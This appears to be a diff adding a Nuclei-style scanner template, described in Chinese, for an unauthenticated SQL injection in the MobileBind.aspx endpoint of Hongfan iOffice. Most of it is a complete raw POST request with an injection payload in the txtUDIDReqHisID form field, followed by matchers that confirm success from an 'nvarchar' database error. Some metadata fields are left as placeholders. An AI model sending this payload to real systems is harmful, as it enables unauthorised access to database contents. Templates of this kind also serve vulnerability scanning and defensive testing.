@@ -1,0 +1,42 @@
+id: hongfan-ioffice-MobileBind-sqli
+info:
+  name: 红帆ioffice MobileBind.aspx SQL 注入漏洞
+  author: leadlife
+  severity: high
+  description: 红帆iOffice的/ioffice/prg/Mobile/Base/MobileBind.aspx接口存在SQL注入漏洞。攻击者可通过构造恶意SQL语句，未经身份验证地获取数据库敏感信息，影响范围包括红帆iOffice系统的数据访问权限。
+  reference: 
+    - https://www.yuque.com/lvguo-pibd8/fqbwsx/owrr3w2cetvu743x
+  classification:
+    cve-id: 
+  metadata:
+    verified: true/false
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: sqli,hongfan,ioffice
+
+http:
+  - raw:
+      - |
+        POST /ioffice/prg/Mobile/Base/MobileBind.aspx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 162
+        Cache-Control: no-cache
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+        X-MicrosoftAjax: Delta=true
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: ASP.NET_SessionId=3k25kimcrs1v4ryvpwo4qb45
+        Connection: close
+
+        __EVENTTARGET=ctl00%24cntForm%24cmdUDIDReqHis&__EVENTARGUMENT=&__VIEWSTATE=先访问网页获取该值&__VIEWSTATEGENERATOR=先访问网页获取该值&btVerify=&ctl00%24cntForm%24txtUDIDReqHisID=1)or 1<user--+-&ctl00%24cntForm%24cmdUDIDReqHis=Button
+                
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'nvarchar')
+        condition: and
